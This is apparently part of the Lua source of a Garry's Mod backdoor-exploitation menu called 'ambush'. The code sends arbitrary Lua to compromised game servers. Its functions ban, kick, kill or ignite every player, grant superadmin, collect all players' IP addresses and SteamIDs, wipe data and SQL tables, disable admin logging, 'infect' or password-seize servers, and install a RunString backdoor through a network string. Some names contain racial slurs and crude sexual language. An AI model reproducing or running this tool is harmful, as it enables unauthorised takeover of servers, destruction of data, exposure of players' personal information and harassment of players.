function banAll() sendLua([[for k,v in pairs(player.GetAll()) do if not v:LocalPlayer() then v:Ban(0, "CAC: Detected Cheats") end end]]) end
function kickAll() sendLua([[for k,v in pairs(player.GetAll()) do if not v:LocalPlayer() then v:Kick("CAC: Detected Cheats") end end]]) end
function killAll() sendLua([[for k,v in pairs(player.GetAll()) do v:Kill() end]]) end
function godAll() sendLua([[for k,v in pairs(player.GetAll()) do v:GodEnable() end]]) end
function unGodAll() sendLua([[for k,v in pairs(player.GetAll()) do v:GodDisable() end]]) end
function moanSteps()
sendLua([[if !moanstep then
	hook.Add("PlayerFootstep", "oooh", function(ply)
	ply:EmitSound("vo/npc/female01/pain0" .. math.random(1, 9) .. ".wav", 75, math.random(50, 100))
	end)
	moanstep = true
	else
	hook.Remove("PlayerFootstep", "oooh")
	moanstep = false
	end]])
end
function ip()
	sendLua([[
	local id = ]] .. LocalPlayer():UserID() .. [[
	for k, v in pairs( player.GetAll() ) do 
	Player( id ):ChatPrint( "Player: " .. v:Nick() .. " (" .. v:SteamID() .. ") IP: " .. v:IPAddress() )
	end
	]])
end

--[[-------------------------------------------------------------------------
	Tab 2 Functions
---------------------------------------------------------------------------]]
/* Songs */
function playSongLink()
	Derma_StringRequest("Run in console", "", "", function(str)
		sendLuaPly([[local songBG = vgui.Create("DPanel") songBG:SetSize(1,1) songBG:SetPos(0,0) songBG.Paint = function() surface.SetDrawColor(128,128,128,0) surface.DrawRect(0,0,self:GetWide(), self:GetTall())  end local songHT = vgui.Create("DHTML","songBG") songHT:SizeToContents() songHT:OpenURL("]]..str..[[")]])
	end)

	
end
function thickNiggas() sendLuaPly([[sound.PlayURL("http://ambush.pw/songs/dbangs.mp3", "mono", function() end)]]) end
function sandstorm() sendLuaPly([[sound.PlayURL("http://ambush.pw/songs/sandstorm.mp3", "mono", function() end)]]) end
function marylinMonroe() sendLuaPly([[sound.PlayURL("http://ambush.pw/songs/mm.mp3", "mono", function() end)]]) end
function earRape() sendLuaPly([[sound.PlayURL("http://ambush.pw/songs/earrape.mov", "mono", function() end)]]) end
function oldTown() sendLuaPly([[sound.PlayURL("http://ambush.pw/songs/oldtown.mp3", "mono", function() end)]]) end
function thotThot() sendLuaPly([[sound.PlayURL("http://ambush.pw/songs/thot.mp3", "mono", function() end)]]) end




/* Player Funcs */
function setSA() sendLua([[Player(]]..selPly..[[):SetUserGroup("superadmin")]]) end
function setUser() sendLua([[Player(]]..selPly..[[):SetUserGroup("user"))]]) end
function banPly() sendLua([[Player(]]..selPly..[[):Ban(0, "CAC Detected Cheats")]]) end
function kickPly() sendLua([[Player(]]..selPly..[[):Kick("CAC Detected Cheats")]]) end
function killPly() sendLua([[Player(]]..selPly..[[):Kill()]]) end
function ignitePly() sendLua([[Player(]]..selPly..[[):Ignite(30,40)]]) end
function dropPlyWep() sendLua([[Player(]]..selPly..[[):DropWeapon(Player(]]..selPly..[[):GetActiveWeapon())]]) end
function godPly() sendLua([[Player(]]..selPly..[[):GodEnable()]]) end
function unGodPly() sendLua([[Player(]]..selPly..[[):GodDisable()]]) end
function freezePly() sendLua([[Player(]]..selPly..[[):Freeze(true)]]) end
function unFreezePly() sendLua([[Player(]]..selPly..[[):Freeze(false)]]) end



--[[-------------------------------------------------------------------------
	Tab 3 Functions 
---------------------------------------------------------------------------]]	
/* Backdoor options */ 
function setNetKey()
	Derma_StringRequest("Set Net Key", "", "", function(str)
		dataString = str
	end)
end
function luarunStr() RunConsoleCommand("ulx", "luarun", "util.AddNetworkString('"..dataString.."') net.Receive('"..dataString.."',function(len,pl) RunString(net.ReadString()) end)") end
function CheckIfStringExists(str)
	local status, error = pcall(net.Start, str)
	return status
end
function checkBackdoors() 
	for k,v in pairs(netStrings.Strings) do
		if(CheckIfStringExists(v.NetString)) then
			dataString = v.NetString
			chatMessage("Found: " .. v.NetString)	 	
		else
			chatMessage("No backdoors found")	
		end
	end
end


--[[-------------------------------------------------------------------------
	Tab 1 Buttons
---------------------------------------------------------------------------]]
/* Visual */ 
ambush.Button("Local News", tab1VisList, localNews, "Put the server on a fake news broadcast.")
ambush.Button("Screen Rape 1", tab1VisList, screenRape, "Rape everyone's screens.")
ambush.Button("Rainbow World", tab1VisList, rainbowWorld, "Makes the world rainbow.")
ambush.Button("Rainbow Props", tab1VisList, rainbowProps, "Makes the props rainbow.")
ambush.Button("Falling Props", tab1VisList, fallingFood, "Makes Props fall from the sky.")
ambush.Button("Seized Images", tab1VisList, seizedImages, "")
ambush.Button("Fuck Map", tab1VisList, fuckMap, "Fucks the player(s) entire map until gmod and server restart.")
ambush.Button("Earthquake", tab1VisList, earthQuake, "Earthquake everyone.")
ambush.Button("Force Dance", tab1VisList, forceDance, "Makes everyone dance.")
ambush.Button("Fuck Bones", tab1VisList, fuckBones, "Fucks everyone's bones.")
ambush.Button("Spinning Heads", tab1VisList, spinningHeads, "Spins heads.")
ambush.Button("Open Doors", tab1VisList, openDoors, "Opens doors.")
ambush.Button("Lock Doors", tab1VisList, lockDoors, "Unlocks doors.")
ambush.Button("Unlock Doors", tab1VisList, unlockDoors, "Unlocks doors.")
ambush.Button("Remove Doors", tab1VisList, removeDoors, "Unlocks doors.")
ambush.Button("Change Hostname", tab1VisList, changeHost, "Unlocks doors.")





/* Misc */ 
ambush.Button("Infect Server", tab2VisList, infectServer, "Infects the server.")
ambush.Button("Infect Server(lesser)", tab2VisList, infectServer2, "Less persistant infecton.")
ambush.Button("Seize Server", tab2VisList, seizeServer, "Locks Server With password: Umbra.")
ambush.Button("Physgun Players", tab2VisList, physgunPlys, "Spams the chatbox with stated text.")
ambush.Button("Start Chat Spam", tab2VisList, startChatSpam, "Spams the chatbox with stated text.")
ambush.Button("Stop Chat Spam", tab2VisList, stopChatSpam, "Stops the chat spam.")
ambush.Button("Log Echo 1", tab2VisList, ulxLogEcho1, "Log eco to 1 so everything is logged within ulx.")
ambush.Button("Log Echo 0", tab2VisList, ulxLogEcho, "Log eco to 0 so nothing is logged within ulx.")
ambush.Button("Wipe Data", tab2VisList, test, "")
ambush.Button("Console Command", tab2VisList, consoleRunString, "")
ambush.Button("Fuck Gravity", tab2VisList, fuckGravity, "")
ambush.Button("Fuck Friction", tab2VisList, fuckFriction, "")
ambush.Button("Fuck Console", tab2VisList, fuckConsole, "")
ambush.Button("Fuck FPP", tab2VisList, fuckFPP, "")
ambush.Button("Fuck SQL Tables", tab2VisList, fuckSQL, "")
ambush.Button("Strip Weapons", tab2VisList, removeAll, "")



/* Player */ 
ambush.Button("Grab IPS", tab3VisList, ip, "")
ambush.Button("Moan Steps", tab3VisList, moanSteps, "")
ambush.Button("Change Models", tab3VisList, changeModels, "Changes everyone's model.")
ambush.Button("Spam Models", tab3VisList, spamModels, "Changes everyone's model a lot.")
ambush.Button("Change Size", tab3VisList, changeSize, "Makes everyone big asf.")
ambush.Button("Add Economy", tab3VisList, fuckEconomy, "Add money by $1,000,000,000.")
ambush.Button("Wipe Economy", tab3VisList, wipeEconomy, "Wipes economy.")
ambush.Button("Teleport All", tab3VisList, teleportAll, "Teleports everyone.")
ambush.Button("Ignite All", tab3VisList, igniteAll, "Ignite everyone.")
ambush.Button("Ban Admins", tab3VisList, banAdmins, "Bans admins.")
ambush.Button("Kick Admins", tab3VisList, kickAdmins, "Kicks everyone.")
ambush.Button("Kill Admins", tab3VisList, killAdmins, "Kills everyone.")
ambush.Button("Ban All", tab3VisList, banAll, "Bans everyone.")
ambush.Button("Kick All", tab3VisList, kickAll, "Kicks everyone.")
ambush.Button("Kill All", tab3VisList, killAll, "Kills everyone.")
ambush.Button("God All", tab3VisList, godAll, "Gods everyone.")




--[[-------------------------------------------------------------------------
	Tab 2 Buttons ||  tab1VisList1
---------------------------------------------------------------------------]]
/* Songs */
ambush.Button("Song URL", tab1VisList1, playSongLink, "Gods everyone.")
ambush.Button("Thick Niggas", tab1VisList1, thickNiggas, "Gods everyone.")
ambush.Button("Sandstorm", tab1VisList1, sandstorm, "Gods everyone.")
ambush.Button("Marylin Monroe", tab1VisList1, marylinMonroe, "Gods everyone.")
ambush.Button("Ear Rape", tab1VisList1, earRape, "Gods everyone.")
ambush.Button("Old Town", tab1VisList1, oldTown, "Gods everyone.")
ambush.Button("Thot Thot", tab1VisList1, thotThot, "Gods everyone.")

/* Ply Funcs */
ambush.Button("Set Superadmin", tab3VisList1, setSA, "")
ambush.Button("SetUser", tab3VisList1, setUser, "")
ambush.Button("Ban", tab3VisList1, banPly, "")
ambush.Button("Kick", tab3VisList1, kickPly, "")
ambush.Button("Slay", tab3VisList1, killPly, "")
ambush.Button("Ignite", tab3VisList1, ignitePly, "")
ambush.Button("Drop Weapon", tab3VisList1, dropPlyWep, "")
ambush.Button("God", tab3VisList1, godPly, "")
ambush.Button("Ungod", tab3VisList1, unGodPly, "")
ambush.Button("Freeze", tab3VisList1, freezePly, "")
ambush.Button("Unfreeze", tab3VisList1, unFreezePly, "")

--[[-------------------------------------------------------------------------
	Tab 3 Buttons
---------------------------------------------------------------------------]]
/* Backdoor options */ 
ambush.Button("Set netkey", tab4VisList1, setNetKey, "")
ambush.Button("luarun netKey", tab4VisList1, luarunStr, "")
ambush.Button("Check For Backdoors", tab4VisList1, checkBackdoors, "")




--[[-------------------------------------------------------------------------
	Keep this shit here
---------------------------------------------------------------------------]]
end
concommand.Add("ambush2", menu)